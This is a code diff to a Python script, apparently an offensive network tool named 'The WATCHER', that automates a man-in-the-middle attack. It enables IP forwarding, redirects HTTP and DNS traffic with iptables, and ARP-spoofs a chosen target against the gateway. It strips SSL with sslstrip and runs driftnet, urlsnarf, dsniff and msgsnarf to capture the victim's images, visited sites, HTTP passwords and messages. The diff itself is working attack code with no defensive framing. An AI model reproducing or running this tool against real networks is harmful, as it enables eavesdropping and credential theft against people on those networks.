@@ -61,16 +61,25 @@ def get_default_gateway_linux():
 
 gateway_ip = (get_default_gateway_linux())
 
+######################
+#                    #
+#GTK WARNING FIXED!	 #
+#					 #
+######################
 
+#Check for root
+
+if not os.geteuid() == 0 :
+	sys.exit("{0}[x]Sorry, You need to be root to use this tool!".format(FAIL))
 
 
 #os commands
 
-flush = "iptables --flush"
-flush_nat = "iptables --flush -t nat"
-traffic_on = "echo 1 > /proc/sys/net/ipv4/ip_forward"
-traffic_redirect = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
-traffic_redirect2 = "iptables -t nat -A PREROUTING -p udp --destination-port 53 -j  REDIRECT --to-port 53"
+flush = "sudo iptables --flush"
+flush_nat = "sudo iptables --flush -t nat"
+traffic_on = "sudo echo 1 > /proc/sys/net/ipv4/ip_forward"
+traffic_redirect = "sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+traffic_redirect2 = "sudo iptables -t nat -A PREROUTING -p udp --destination-port 53 -j  REDIRECT --to-port 53"
 
 #arpspoof_interface = """"arpspoof -i """
 #arpspoof_target = " -t "
@@ -81,8 +90,8 @@ exit = "exit"
 
 w = sleep(0.5)
 
-os.system("apt install driftnet")
-os.system("apt install sslstrip")
+os.system("sudo apt install driftnet")
+os.system("sudo apt install sslstrip")
 os.system ("clear")
 #Terms & Conditions>
 try:
@@ -90,7 +99,7 @@ try:
 	import terms
 except ImportError:
 	print ("{0}[{1}x{0}]{2}Error:Some files is NOT FOUND!").format(WHITE , RED , RED)
-	os.system("exit")	
+	sys.exit(0)	
 
 #banner starting../
 try:
@@ -98,12 +107,17 @@ try:
 	import banner
 except ImportError:
 	print ("{0}[{1}x{0}]{2}Error:Some files is NOT FOUND!").format(WHITE , RED , RED)
-	os.system("exit")
+	sys.exit(0)
 
 
 
 #installing python-nmap
-os.system("pip install python-nmap")
+try:
+	os.system("sudo pip install python-nmap")
+except IOError:
+	sys.exit("{}[x]Something went wrong\nHint:make sure that you have an internet connection!".format(FAIL))
+except KeyboardInterrupt:
+	sys.exit("{}[x]Loading some tools has been interupted!\nHint:some tools need to installed first before continue using this tool!".format(FAIL))
 print
 #loading...
 print ("{}").format(Cafe)
@@ -151,7 +165,7 @@ try:
 		sleep(1.2)
 		#os.system(flush)
 		#os.system(flush_nat)
-		#os.system (traffic_on)
+		os.system (traffic_on)
 		
 		print ("\n{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
 		sleep(2.2)
@@ -187,17 +201,19 @@ try:
 		print"""\n{}Choose between these interfaces: 
 		""".format(Cafe)
 		sleep(0.5)
-		interface_list = "ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'"
+		interface_list = "sudo ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'"
 		os.system(interface_list)
 
 		print ("\n{}Enter your network interface : ").format(BLUE)
 		print ("{}").format(BLUE)
 		interface = raw_input("\nThe WATCHER > ")
-		#############################################################################################################################################
+		
+		#######################################LAUNCH THE ATTACK!#######################################################################################
+		
 		sleep (1.0)
 		print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe) 
 		
-		arp = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "arpspoof -i {0} -t {1} {2}; bash"'.format(interface , target_ip , gateway_ip)
+		arp = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e arpspoof -i {0} -t {1} {2} &'.format(interface , target_ip , gateway_ip)
 		os.system (arp)
 		
 		sleep (2.0)
@@ -208,10 +224,8 @@ try:
 		sleep (2.0)
 		print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
 		sleep(0.5)
-		sslstrip = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "sslstrip -l 8080; bash"'
+		sslstrip = 'sudo xterm -geometry 65x19-0-0 -fg "#0500FF" -e sslstrip -l 8080 &'
 		os.system (sslstrip)
-		#################################################################################
-		
 		
 		#
 		def choices ():
@@ -240,14 +254,12 @@ try:
 			sleep (0.3)
 			print ("{}").format(BLUE)
 			client_choice = raw_input ("\nThe WATCHER > ")
-
-			###################################################################
 			
 
 			if client_choice == "1":
 				sleep (1.0)
 				print("\n{0}[{1}+{0}]{2}Sniffing Images").format(RED , WHITE , Cafe)
-				driftnet = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "driftnet -i {0} -b; bash"'.format(interface)
+				driftnet = 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e driftnet -i {0} &'.format(interface)
 				print
 				os.system(driftnet)
 				return(choices())
@@ -255,7 +267,7 @@ try:
 			elif client_choice == "2":
 				sleep (1.0)
 				print ("\n{0}[{1}+{0}]{2}Sniffing Websites").format(RED , WHITE , Cafe)
-				urlsnarf = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "urlsnarf -i {}; bash"'.format(interface)
+				urlsnarf = 'sudo xterm -geometry 65x19+0-0 -fg "#33FF00" -e urlsnarf -i {} &'.format(interface)
 				print
 				os.system (urlsnarf)
 				return(choices())
@@ -264,7 +276,7 @@ try:
 			elif client_choice == "3":
 				sleep (1.0)
 				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP passwords...").format(RED , WHITE , Cafe)
-				dsniff = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "dsniff -i {}; bash"'.format(interface)
+				dsniff = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e dsniff -i {} &'.format(interface)
 				print
 				os.system(dsniff)
 				return(choices())
@@ -272,7 +284,7 @@ try:
 			elif client_choice == "4":
 				sleep (1.0)
 				print ("\n{0}[{1}+{0}]{2}Sniffing low encrypted messages...").format(RED , WHITE , Cafe)
-				msgsnarf = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "msgsnarf -i {}; bash"'.format(interface)
+				msgsnarf = 'sudo xterm -geometry 65x19-0-0 -e msgsnarf -i {} &'.format(interface)
 				print
 				os.system(msgsnarf)
 				return(choices())
@@ -281,10 +293,10 @@ try:
 				sleep (1.0)
 				print ("\n{0}Warning{1}: {2}Many pop-ups will appear!").format(RED , WHITE , Cafe)
 				sleep (5.0)
-				driftnet= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "driftnet -i {0}; bash"'.format(interface)
-				urlsnarf= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "urlsnarf -i {}; bash"'.format(interface)
-				dsniff= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "dsniff -i {}; bash"'.format(interface)
-				msgsnarf= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "msgsnarf -i {}; bash"'.format(interface)
+				driftnet= 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e driftnet -i {0} &'.format(interface)
+				urlsnarf= 'sudo xterm -geometry 65x19+0-0 -fg "#33FF00" -e urlsnarf -i {} &'.format(interface)
+				dsniff= 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e dsniff -i {} &'.format(interface)
+				msgsnarf= 'sudo xterm -geometry 65x19-0-0 -e msgsnarf -i {} &'.format(interface)
 				os.system(driftnet)
 				sleep (4.0)
 				os.system(urlsnarf)
@@ -305,7 +317,7 @@ try:
 		print ("\n{0}[{1}x{0}]Exiting...").format(RED , WHITE)
 	else:
 		print ("\n{}[x]Wrong Entry").format(RED)
-		os.system (exit)
+		sys.exit(0)
 
 except KeyboardInterrupt :
 	print ("""\n{0}[{1}x{0}]{2}Program has been ended
